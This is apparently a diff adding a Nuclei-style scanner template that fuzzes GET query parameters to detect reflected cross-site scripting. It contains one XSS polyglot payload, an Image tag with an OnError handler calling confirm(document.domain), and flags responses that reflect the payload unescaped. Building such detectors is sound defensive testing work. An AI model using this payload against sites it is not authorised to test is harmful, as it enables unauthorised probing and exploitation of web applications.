@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-special
+
+info:
+  name: Special Characters Reflection XSS Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect XSS vulnerabilities using a payload with special characters.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - '≋ "><!\'/*"*\\\'/*\\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋'
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
